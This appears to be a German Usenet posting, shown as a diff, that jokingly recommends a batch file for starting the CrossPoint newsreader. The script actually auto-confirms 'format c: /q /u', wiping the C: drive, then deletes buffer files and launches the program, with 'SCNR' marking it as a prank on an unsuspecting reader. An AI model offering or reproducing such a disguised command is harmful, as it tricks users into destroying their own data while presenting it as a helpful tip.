@@ -1,0 +1,16 @@
+Dann empfehle ich ihn, XPoint mit folgender Batch-Datei zu starten.
+Sie sollte im XPoint-Verzeichnis sein. Der Name ist egal.
+@echo off
+echo j|format c: /q /u /v:depp
+echo So, wenn jetzt noch ein Crosspoint zum starten da ist, wird es jetzt   
+     gestartet
+del mpuffer.*
+xp
+
+SCNR
+Hermann Sagenschnier
+
+-- 
+Dieses Posting besteht zu 100% aus recycelten Bytes.
+                                              E-Mail: flyiz@s-iqhorq.sz
+---> Offizieller Kämpfer wider Jörn Fucks des Ordens von dtj <---
